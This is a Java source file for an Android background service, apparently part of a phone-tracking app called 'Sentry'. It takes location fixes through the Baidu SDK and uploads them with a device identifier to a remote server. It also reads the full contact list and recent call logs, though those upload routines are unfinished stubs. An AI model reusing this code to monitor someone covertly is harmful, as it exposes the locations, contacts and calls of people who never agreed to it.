package com.ville.sentry;

import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.os.AsyncTask;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.ContactsContract.PhoneLookup;
import android.text.TextUtils;

import com.baidu.location.BDGeofence;
import com.baidu.location.BDLocation;
import com.baidu.location.BDLocationListener;
import com.baidu.location.LocationClient;
import com.baidu.location.LocationClientOption;
import com.baidu.location.LocationClientOption.LocationMode;
import com.ville.sentry.bean.SCall;
import com.ville.sentry.bean.SContact;
import com.ville.sentry.bean.SLocation;
import com.ville.sentry.bean.WebResult;
import com.ville.sentry.db.DBDao;
import com.ville.sentry.db.DBImpl;

public class WorkService extends Service {
	
	/**
     * Timestamp (milliseconds since epoch) of when this contact was last updated.  This
     * includes updates to all data associated with this contact including raw contacts.  Any
     * modification (including deletes and inserts) of underlying contact data are also
     * reflected in this timestamp.
     */
    public static final String CONTACT_LAST_UPDATED_TIMESTAMP =
            "contact_last_updated_timestamp";

	public static final String ACTION_LOCATION_REQ 		= "sentry.action.loc.req";
	public static final String ACTION_LOCATION_UPLOAD 	= "sentry.action.loc.upload";
	public static final String ACTION_CONTACT_REQ 		= "sentry.action.contact.req";
	public static final String ACTION_CALL_LOG_REQ 		= "sentry.action.call_log.req";
	public static final String ACTION_MMS_REQ 			= "sentry.action.mms.req";
	
	public static final String KEY_LOCATION_UPLOAD_TIME 	= "sentry.key.loction.UploadTime";
	
	public static final String KEY_CONTACT_LAST_UPDATE_TIME = "sentry.key.contact.lastUpdateTime";
	
	private LocationClient mClient;
	private MyLocationListener mLocationListener;
	private static final String TAG = "Sentry/WorkService";
	
	public WorkService() {
		// TODO Auto-generated constructor stub
	}
	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		AppLog.d(TAG, "[onCreate]: WorkService ");
		mClient = new LocationClient(this.getApplicationContext());
		mLocationListener = new MyLocationListener();
		mClient.registerLocationListener(mLocationListener);
		
		initLocationParams();
	}
	
	private void initLocationParams(){
		//定位模式
		LocationMode mode = LocationMode.Hight_Accuracy;
		//坐标类型
		String coor = BDGeofence.COORD_TYPE_GCJ;
		//扫描的时间间隔
		//int span = 10000;
		
		LocationClientOption option = new LocationClientOption();
		option.setLocationMode(mode);
		option.setCoorType(coor);
		// setScanSpan(1000): 当不设此项，或者所设的整数值小于1000（ms）时，采用一次定位模式。
		// 每调用一次requestLocation( )，定位SDK会发起一次定位。请求定位与监听结果一一对应。
		//option.setScanSpan(span);
		option.setIsNeedAddress(true); //是否解析为实际地址
		mClient.setLocOption(option);
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		AppLog.d(TAG, "[onBind]: WorkService ");
		return null;
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
//		Toast.makeText(this, "repeating alarm", Toast.LENGTH_SHORT).show();
		AppLog.d(TAG, "[onStartCommand] " + new Date() + ", " + intent.getAction());
		String action = intent.getAction();
		if(ACTION_LOCATION_REQ.equals(action)){
			if(!mClient.isStarted()){
				mClient.start();
				mClient.requestLocation();
			}else {
				AppLog.d(TAG, "[onStartCommand] ReqLocation is Running, SKIP this request.");
			}
		}else if (ACTION_LOCATION_UPLOAD.equals(action)){
			new UploadLocationTask().execute();
			
		}else if (ACTION_CONTACT_REQ.equals(action)){
			new ReqContactTask().execute();
			
		}else if (ACTION_CALL_LOG_REQ.equals(action)){
			new ReqCallLogTask().execute();
			
		}else if (ACTION_MMS_REQ.equals(action)){
			new ReqMmsTask().execute();
		}
		return super.onStartCommand(intent, flags, startId);
	}
	
	
	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
		AppLog.d(TAG, "[onDestroy]: WorkService ");
		if(mClient!= null && mClient.isStarted()){
			mClient.stop();
			mClient.unRegisterLocationListener(mLocationListener);
		}
	}
	
	
	/**
	 * 实现实位回调监听
	 */
	private class MyLocationListener implements BDLocationListener {
		
		@Override
		public void onReceiveLocation(BDLocation location) {
			//Receive Location 
			StringBuffer sb = new StringBuffer(256);
			sb.append("Now: " + new Date() + "\n");
			sb.append("时间: " + location.getTime()).append("\n");
			sb.append("ErrorCode : " + location.getLocType()).append("\n");
			sb.append("纬度 : " + location.getLatitude()).append("\n");
			sb.append("精度 : " + location.getLongitude()).append("\n");
			sb.append("精度(m) : " + location.getRadius()).append("\n");
			sb.append("地址: " + location.getAddrStr()).append("\n");
			int locType = location.getLocType();
			String locTypeStr = null;
			if (locType == BDLocation.TypeGpsLocation){
				locTypeStr = "GPS定位";
				sb.append("类型：GPS定位").append("\n");
				sb.append("速度: " + location.getSpeed()).append("\n");
				sb.append("卫星数: " + location.getSatelliteNumber()).append("\n");
			} else if (locType == BDLocation.TypeNetWorkLocation){
				locTypeStr = "网络定位-" + parseOperatorCode(location.getOperators());
				sb.append("类型：网络定位").append("\n");
				sb.append("运营商 : " + parseOperatorCode(location.getOperators())).append("\n");
			} else if (locType == BDLocation.TypeOffLineLocation){
				locTypeStr = "离线定位";
				sb.append("类型：离线定位").append("\n");
			} else {
				sb.append("定位失败").append("\n");
			}
			if(locType == BDLocation.TypeGpsLocation
					|| locType == BDLocation.TypeNetWorkLocation
					|| locType == BDLocation.TypeOffLineLocation){
				SLocation loc = new SLocation();
				loc.time = location.getTime();
				loc.addr = location.getAddrStr();
				loc.city = location.getCity();
				loc.latitude = location.getLatitude();
				loc.longitude = location.getLongitude();
				loc.province = location.getProvince();
				loc.locType = locTypeStr;
				loc.radius = location.getRadius();
				DBDao db = DBImpl.getInstance();
				db.insertLocation(loc);
				AppLog.d(TAG, "insertIntoLocation: t[" + loc.time + "], <" + loc.addr + ">");
				// AppLog.d(TAG, "insertIntoLocation: <" + sb.toString() + ">");
				
				if(Utility.isConnected(WorkService.this)){
					SentryApplication.getApp().startUploadLocation(WorkService.this);
				}
			}else {
				AppLog.d(TAG, "request location FAILED!!");
			}
			
			if(mClient != null && mClient.isStarted()){
				AppLog.d(TAG, "Client STOP");
				mClient.stop();
			}
			
		}
	}
	
	private String getLatestFromLocal(){
		DBDao db = DBImpl.getInstance();
		String latest = db.getLatestTime();
		if(TextUtils.isEmpty(latest)){
			latest = "2015-01-01 01:00:00";
		}
		return latest;
	}
	private boolean uploadLocationList(ArrayList<SLocation> locations){
		HashMap<String, String> map = new HashMap<String, String>();
		map.put("locations", SLocation.buildJsonStr(locations));
		map.put("uuid", SentryApplication.getApp().getUuid());
		map.put("model", android.os.Build.MODEL);
		String responce = NetUtil.doPost(Common.URL_LOCATION_UPLOAD, map);
		WebResult result = WebResult.parseByJson(responce);
		return result != null && result.success;
	}
	private boolean uploadLocations(String sinceTime){
		ArrayList<SLocation> locations = DBImpl.getInstance().getLocations(sinceTime);
//		String serverLatest = getLatestFromServer();
//		AppLog.d(TAG, "size is " + locations.size() + ", Since Sever " + serverLatest);
		boolean success = false;
		if(locations != null && locations.size() > 0){
			success = uploadLocationList(locations);
			AppLog.d(TAG, "uploadLocations success ? " + success);
		} else {
			AppLog.d(TAG, "No new locations Found!!");
		}
		return success;
	}
	
	private String parseOperatorCode(int code){
		switch (code) {
		case BDLocation.OPERATORS_TYPE_MOBILE:
			return "中国移动";
		case BDLocation.OPERATORS_TYPE_TELECOMU:
			return "中国电信";
		case BDLocation.OPERATORS_TYPE_UNICOM:
			return "中国联通";
		case BDLocation.OPERATORS_TYPE_UNKONW:
		default:
			return "未知/WiFi";
		}
	}
	
	class UploadLocationTask extends AsyncTask<Void, Void, Boolean> {

		@Override
		protected Boolean doInBackground(Void... params) {
			// TODO Auto-generated method stub
			String lastUpload = SentryApplication.getApp().getLocationLastUploadTime();
			return uploadLocations(lastUpload);
		}
		
		@Override
		protected void onPostExecute(Boolean result) {
			// TODO Auto-generated method stub
			if(result){
				String lastest = getLatestFromLocal();
				SentryApplication.getApp().setLocationLastUploadTime(lastest);
			}
		}
		
	}
	
	class ReqContactTask extends AsyncTask<Void, Void, Boolean> {

		@Override
		protected Boolean doInBackground(Void... params) {
			// TODO Auto-generated method stub
			ContentResolver cr = getContentResolver();
			long lastUpdateDB = getContactLastestUpdateTime(cr);
			long lastUpdateLocal = SentryApplication.getApp().getContactLastUpdateTime();
			if(lastUpdateLocal < lastUpdateDB){
				Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
				AppLog.d(TAG, "[Contact] size = " + cursor.getCount());
				ArrayList<SContact> list = new ArrayList<SContact>();
				while(cursor.moveToNext()){
					SContact contact = new SContact();
					String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
				    String name = cursor.getString(cursor.getColumnIndex(PhoneLookup.DISPLAY_NAME));
					
				    //查询该位联系人的电话号码，类似的可以查询email，photo
				    String[] proj = new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER};
				    String selection = ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=?";
				    String seleArgs[] = new String[]{contactId};
				    Cursor phoneCursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, proj,
				    		selection, seleArgs, null);
				    //一个人可能有几个号码
				    StringBuilder sb = new StringBuilder();
				    while(phoneCursor.moveToNext()){
				        String strPhoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
				        sb.append(strPhoneNumber + ",");
				    }
				    contact.idStr = Utility.genContactId(name, contactId);
					contact.name = name;
					contact.numbers = sb.toString();
					list.add(contact);
					AppLog.d(TAG, "[Contact] > " + contact);
					
				    phoneCursor.close();
				}
				cursor.close();
				return true;
			}else {
				AppLog.d(TAG, "[Contact] Can not found updates in contact database, SKIP!!");
				return false;
			}
		}
		
		@Override
		protected void onPostExecute(Boolean result) {
			// TODO Auto-generated method stub
			if(result){
				
			}
		}
	}
	
	class ReqCallLogTask extends AsyncTask<Void, Void, Boolean> {
		
		@Override
		protected Boolean doInBackground(Void... params) {
			// TODO Auto-generated method stub
			ContentResolver cr = getContentResolver();
			Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, 
					CallLog.Calls.DATE + " DESC LIMIT 50");
			AppLog.d(TAG, "[Call] size = " + cursor.getCount());
			ArrayList<SCall> list = new ArrayList<SCall>();
			while(cursor.moveToNext()){
				SCall call = new SCall();
//			    long _id = cursor.getLong(cursor.getColumnIndex(CallLog.Calls._ID));
				call.number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
				call.date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
				call.duration = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DURATION));
				call.name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
				call.type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
			    AppLog.d(TAG, "[Call] > " + call.toString());
			    list.add(call);
			}
			cursor.close();
			return updateCalls();
		}
		
		@Override
		protected void onPostExecute(Boolean result) {
			// TODO Auto-generated method stub
			if(result){
			}
		}
	}
	
	class ReqMmsTask extends AsyncTask<Void, Void, Boolean> {
		
		@Override
		protected Boolean doInBackground(Void... params) {
			// TODO Auto-generated method stub
			return false;
		}
		
		@Override
		protected void onPostExecute(Boolean result) {
			// TODO Auto-generated method stub
			if(result){
			}
		}
	}
	
	private boolean updateCalls() {
		// TODO Auto-generated method stub
		return false;
	}
	
	private boolean updateContacts() {
		// TODO Auto-generated method stub
		return false;
	}
	
	private long getContactLastestUpdateTime(ContentResolver cr){
		Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI,
				new String[]{CONTACT_LAST_UPDATED_TIMESTAMP},
				null,
				null,
				CONTACT_LAST_UPDATED_TIMESTAMP + " DESC limit 1"
				);
		long lastUpdate = 0L;
		if(cursor != null && cursor.getCount() > 0 && cursor.moveToNext()){
			lastUpdate = cursor.getLong(cursor.getColumnIndex(CONTACT_LAST_UPDATED_TIMESTAMP));
			cursor.close();
		}
		AppLog.d(TAG, "getContactLastestUpdateTime " + lastUpdate + ", " + new Date(lastUpdate));
		return lastUpdate;
	}
	
	
	/*
	 * 获取error code：
	public int getLocType ( )
	返回值：
	
	61 ： GPS定位结果
	62 ： 扫描整合定位依据失败。此时定位结果无效。
	63 ： 网络异常，没有成功向服务器发起请求。此时定位结果无效。
	65 ： 定位缓存的结果。
	66 ： 离线定位结果。通过requestOfflineLocaiton调用时对应的返回结果
	67 ： 离线定位失败。通过requestOfflineLocaiton调用时对应的返回结果
	68 ： 网络连接失败时，查找本地离线定位时对应的返回结果
	161： 表示网络定位结果
	162~167： 服务端定位失败
	
	
	Hight_Accuracy
	高精度定位模式下，会同时使用GPS、Wifi和基站定位，返回的是当前条件下精度最好的定位结果</string>
    Battery_Saving
    低功耗定位模式下，仅使用网络定位即Wifi和基站定位，返回的是当前条件下精度最好的网络定位结果</string>
   	Device_Sensors
    仅用设备定位模式下，只使用用户的GPS进行定位。这个模式下，由于GPS芯片锁定需要时间，首次定位速度会需要一定的时间</string>
	 
	 * */
	
}
